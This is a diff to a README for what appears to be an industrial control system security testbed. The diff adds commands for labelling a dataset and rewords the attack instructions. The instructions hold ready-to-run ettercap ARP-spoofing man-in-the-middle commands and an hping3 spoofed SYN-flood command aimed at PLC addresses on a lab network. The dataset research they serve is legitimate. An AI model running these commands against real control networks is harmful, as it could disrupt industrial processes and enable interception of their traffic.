@@ -44,7 +44,13 @@ The collected dataset is stored as 'data.csv' in logs folder.
 Automated labelling of the generated dataset is done in two steps: 
 
 1) Run label.py script to label dataset based on threshold conditions (For false data injection and DoS)
-2) Run label1.py after step 1 by passing 3 arguments (start_time, end_time and attack type). Results stored as 'labelled.csv' in logs folder.
+   ```
+   python label.py
+   ```
+2) Run label1.py after step 1 by passing 3 arguments (start_time, end_time and attack type). Results are stored as 'labelled.csv' in the logs folder.
+   ```
+   python label1.py '2021-07-01 16:04:07.681880' '2021-07-01 16:05:11.900075' Calculated Measurement Modification 
+   ```
 
 **Executing attacks**
 
@@ -56,17 +62,17 @@ IP to nodes mapping: PLC1 <--> 10.0.0.1, PLC2 <--> 10.0.0.2, PLC3 <--> 10.0.0.3,
 
     python attack_fdi.py <x>
 
-**Attack scenario 2, 3, 4** (Network DoS MitM/DoS): Run the following commands for attacks 2, 3, 4 respectively.
+**Attack scenarios 2, 3, 4** (Network DoS: MitM): Run the following commands for attack scenarios 2, 3, 4, respectively.
 
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.2//
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// /10.0.0.3//
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// 
 
-**Attack scenario 5** (Network DoS TCP SYN flooding)
+**Attack scenario 5** (Network DoS: TCP SYN flooding)
 
     hping3 -S -a 10.0.0.4 --flood -V -p 44818 10.0.0.1
 
-**Note**: Attacks 6 till 23 are MitM attacks. Attacker node is placed b/w two nodes and ip forwarding enabled using the following commands.
+**Note**: Attacks 6 till 23 are done using MitM attacks. Attacker node is placed b/w two nodes and IP forwarding is enabled using the following commands.
 
     ettercap -T -i attacker-eth0 -M ARP /10.0.0.1// &
     echo 1 > /proc/sys/net/ipv4/ip_forward
